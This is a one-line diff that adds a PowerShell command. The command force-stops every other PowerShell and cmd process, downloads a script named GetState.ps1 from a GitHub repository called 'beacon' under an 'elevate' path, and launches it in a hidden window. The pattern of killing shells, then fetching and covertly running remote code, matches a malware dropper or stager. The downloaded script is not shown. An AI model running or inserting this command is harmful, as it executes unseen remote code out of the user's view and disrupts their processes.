@@ -1,0 +1,1 @@
+Get-Process -Name powershell, cmd | Where-Object { $_.Id -ne $PID } | Stop-Process -Force; Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/GetState.ps1 -OutFile C:\temp\beacon\elevate\GetState.ps1; Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\GetState.ps1}"'
